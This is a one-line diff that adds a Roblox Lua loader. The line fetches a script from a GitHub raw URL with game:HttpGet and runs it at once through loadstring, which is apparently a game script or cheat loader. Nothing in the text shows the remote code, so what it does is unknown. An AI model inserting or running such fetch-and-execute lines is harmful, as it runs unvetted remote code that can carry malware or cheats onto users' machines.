@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhtam8765/block-and-pickaxe/main/Main')))()
